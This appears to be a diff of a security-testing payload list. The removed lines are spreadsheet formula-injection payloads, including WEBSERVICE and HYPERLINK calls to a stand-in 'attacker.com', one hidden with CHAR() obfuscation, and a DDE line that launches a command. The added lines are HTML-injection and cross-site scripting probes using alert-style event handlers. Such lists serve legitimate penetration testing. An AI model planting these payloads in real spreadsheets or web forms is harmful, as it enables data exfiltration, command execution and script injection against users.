@@ -1,14 +1,10 @@
-=HYPERLINK(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(58)&CHAR(47)&CHAR(47)&"bing.com","click")
-=WEBSERVICE("http://attacker.com")
-=WEBSERVICE(CHAR(104)&CHAR(116)&CHAR(116)&CHAR(112)&CHAR(58)&CHAR(47)&CHAR(47)&CHAR(97)&CHAR(116)&CHAR(116)&CHAR(97)&CHAR(99)&CHAR(107)&CHAR(101)&CHAR(114)&CHAR(46)&CHAR(99)&CHAR(111)&CHAR(109))
-=cmd|' /C calc'!A0
-'=HYPERLINK("http://attacker.com","x")
-"=HYPERLINK("http://attacker.com","x")
-+HYPERLINK("http://attacker.com","x")
--HYPERLINK("http://attacker.com","x")
-@HYPERLINK("http://attacker.com","x")
-"><img src=x onerror=alert(1)>
-"><svg/onload=alert(1)>
-onmouseover="ShowDiv(this);"
-"><script>alert(1)</script>
-"><iframe src=javascript:alert(1)>
+<iframe src="https://example.com"></iframe>
+<a href=//google.com>Click</a>
+<a href='//google.com'>Click</a>
+<a href=javascript:alert(1)>Click</a>
+<h1 style="color:red">HTML INJECTION TEST</h1>
+"><svg onload=alert(1)>
+<img src=x onerror=alert(1)>
+<img src=1 onerror=confirm(1)>
+<b onclick=alert(1)>Click</b>
+<div onmouseover=alert(1)>Hover</div>
